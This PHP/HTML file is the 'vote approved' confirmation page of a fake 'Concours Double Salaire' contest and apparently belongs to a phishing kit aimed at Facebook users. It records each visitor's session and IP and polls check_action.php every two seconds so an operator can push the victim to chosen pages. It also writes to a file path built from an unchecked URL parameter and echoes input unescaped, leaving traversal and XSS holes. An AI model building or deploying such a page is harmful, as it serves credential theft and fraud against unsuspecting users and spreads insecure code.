<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    die("Paramètres manquants");
}

// Mettre à jour le fichier de suivi
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'vote_approved.php',
    'timestamp' => time(),
    'ip' => $clientIp
];
file_put_contents($trackingFile, json_encode($trackingData));
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vote approuvé</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.6;
            background-image: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
        }
        
        .container {
            max-width: 450px;
            margin: 0 auto;
            padding: 30px 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            max-width: 70px;
            margin-bottom: 15px;
            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
        }
        
        .success-card {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            padding: 30px;
            margin-bottom: 20px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .success-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 6px;
            background: linear-gradient(90deg, #4CAF50, #8BC34A);
        }
        
        .success-icon {
            font-size: 60px;
            color: #4CAF50;
            margin-bottom: 25px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.1);
            }
            100% {
                transform: scale(1);
            }
        }
        
        .success-title {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #4CAF50;
            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        
        .success-message {
            color: #555;
            margin-bottom: 25px;
            font-size: 17px;
            line-height: 1.7;
        }
        
        .vote-info {
            display: flex;
            align-items: center;
            margin: 25px 0;
            padding: 15px;
            background-color: #f1f8e9;
            border-radius: 10px;
            border-left: 4px solid #4CAF50;
        }
        
        .vote-icon {
            font-size: 28px;
            color: #4CAF50;
            margin-right: 15px;
        }
        
        .vote-text {
            font-size: 16px;
            color: #2E7D32;
            font-weight: 500;
            text-align: left;
        }
        
        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            background-color: #f44336;
            border-radius: 50%;
            animation: confetti-fall 5s linear infinite;
            z-index: -1;
        }
        
        @keyframes confetti-fall {
            0% {
                transform: translateY(-100vh) rotate(0deg);
                opacity: 1;
            }
            100% {
                transform: translateY(100vh) rotate(360deg);
                opacity: 0;
            }
        }
        
        .home-button {
            display: inline-block;
            padding: 14px 24px;
            background: linear-gradient(90deg, #4CAF50, #8BC34A);
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
            box-shadow: 0 4px 10px rgba(76, 175, 80, 0.3);
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        .home-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(76, 175, 80, 0.4);
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #65676b;
            font-size: 13px;
        }
        
        .footer a {
            color: #4CAF50;
            text-decoration: none;
            font-weight: 500;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .steps {
            display: flex;
            justify-content: space-between;
            margin: 30px 0;
            position: relative;
        }
        
        .steps::before {
            content: '';
            position: absolute;
            top: 15px;
            left: 10%;
            right: 10%;
            height: 2px;
            background-color: #e0e0e0;
            z-index: -1;
        }
        
        .step {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 33%;
        }
        
        .step-icon {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background-color: #4CAF50;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: bold;
        }
        
        .step-text {
            font-size: 12px;
            color: #555;
            text-align: center;
        }
        
        .step.active .step-icon {
            background-color: #4CAF50;
        }
        
        .step.active .step-text {
            color: #4CAF50;
            font-weight: bold;
        }
        
        .countdown {
            margin: 20px 0;
            font-size: 16px;
            color: #555;
        }
        
        .countdown-value {
            font-weight: bold;
            color: #4CAF50;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 20px 15px;
            }
            
            .success-title {
                font-size: 24px;
            }
            
            .success-message {
                font-size: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <!-- <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/150px-Facebook_f_logo_%282019%29.svg.png" alt="Logo" class="logo"> -->
        </div>
        
        <div class="success-card">
            <div class="success-icon">
                <i class="fas fa-check-circle"></i>
            </div>
            
            <div class="success-title">Merci pour votre vote !</div>
            <p class="success-message">Votre participation au concours Double Salaire a été enregistrée avec succès. </p>
            
            <div class="steps">
                <div class="step active">
                    <div class="step-icon">1</div>
                    <div class="step-text">Vote</div>
                </div>
                <div class="step active">
                    <div class="step-icon">2</div>
                    <div class="step-text">Vérification</div>
                </div>
                <div class="step active">
                    <div class="step-icon">3</div>
                    <div class="step-text">Confirmation</div>
                </div>
            </div>
            
        
            
            <div class="countdown">
                Prochain tirage dans : <span class="countdown-value" id="countdown">3 jours</span>
            </div>
            
            <a href="index.php?session=<?php echo $sessionId; ?>&ip=<?php echo $clientIp; ?>" class="home-button">
                <i class="fas fa-home"></i> Retour à l'accueil
            </a>
        </div>
        
        <div class="footer">
            <p>© 2025 Concours Double Salaire. Tous droits réservés.</p>
            <p><a href="#">Conditions d'utilisation</a> · <a href="#">Politique de confidentialité</a></p>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo $sessionId; ?>';
            const clientIp = '<?php echo $clientIp; ?>';
            
            // Créer des confettis
            function createConfetti() {
                const colors = ['#4CAF50', '#8BC34A', '#CDDC39', '#FFEB3B', '#FFC107', '#FF9800', '#FF5722', '#f44336', '#E91E63', '#9C27B0'];
                
                for (let i = 0; i < 150; i++) {
                    const confetti = document.createElement('div');
                    confetti.className = 'confetti';
                    confetti.style.left = Math.random() * 100 + 'vw';
                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                    confetti.style.width = (Math.random() * 10 + 5) + 'px';
                    confetti.style.height = (Math.random() * 10 + 5) + 'px';
                    confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
                    confetti.style.animationDelay = (Math.random() * 5) + 's';
                    
                    document.body.appendChild(confetti);
                    
                    // Supprimer les confettis après l'animation
                    setTimeout(() => {
                        confetti.remove();
                    }, 8000);
                }
            }
            
            // Lancer les confettis
            createConfetti();
            
            // Simuler un compte à rebours
            const countdownEl = document.getElementById('countdown');
            let days = 2;
            let hours = 23;
            let minutes = 59;
            let seconds = 59;
            
            function updateCountdown() {
                if (seconds > 0) {
                    seconds--;
                } else {
                    seconds = 59;
                    if (minutes > 0) {
                        minutes--;
                    } else {
                        minutes = 59;
                        if (hours > 0) {
                            hours--;
                        } else {
                            hours = 23;
                            if (days > 0) {
                                days--;
                            }
                        }
                    }
                }
                
                countdownEl.textContent = `${days} jours ${hours}h ${minutes}m ${seconds}s`;
            }
            
            // Mettre à jour le compte à rebours chaque seconde
            setInterval(updateCountdown, 1000);
            
            // Fonction pour vérifier s'il y a une action à effectuer
            function checkAction() {
                fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
                .then(response => response.json())
                .then(data => {
                    if (data.action) {
                        if (data.action === 'custom' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else {
                            window.location.href = data.action + '.php?session=' + sessionId + '&ip=' + clientIp;
                        }
                    }
                })
                .catch(error => {
                    console.error('Erreur lors de la vérification des actions:', error);
                });
            }
            
            // Vérifier les actions toutes les 2 secondes
            setInterval(checkAction, 2000);
        });
    </script>
</body>
</html>